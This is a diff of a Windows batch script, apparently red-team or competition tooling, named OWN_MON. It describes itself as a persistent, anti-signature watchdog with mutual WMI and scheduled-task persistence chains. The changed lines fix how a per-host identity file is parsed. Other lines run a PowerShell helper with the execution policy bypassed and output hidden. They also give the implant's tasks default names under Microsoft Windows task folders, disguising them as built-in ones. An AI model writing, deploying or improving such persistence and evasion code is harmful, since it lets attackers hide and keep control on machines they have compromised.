@@ -1,6 +1,6 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260802M17
+rem  OWN_MON  BUILD 20260802M18
 rem  Persistent watchdog - identity-aware (anti-signature), mutual
 rem  WMI+schtasks chains, MSI fallback chain, state.json, digest HB.
 rem  Authorized internal deployment - lab/competition scope only.
@@ -46,7 +46,7 @@ set "MSIEXIT=not-run"
 
 rem ── per-host identity (anti-signature) ────────────────────────
 if not exist "%WD%\identity.cfg" if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
-if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,2 delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%V"
+if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
 if not defined TASK_A set "TASK_A=\Microsoft\Windows\Diagnosis\Scheduled"
 if not defined TASK_B set "TASK_B=\Microsoft\Windows\PLA\Server"
 if not defined TASK_C set "TASK_C=\Microsoft\Windows\WDI\ResolutionHost"
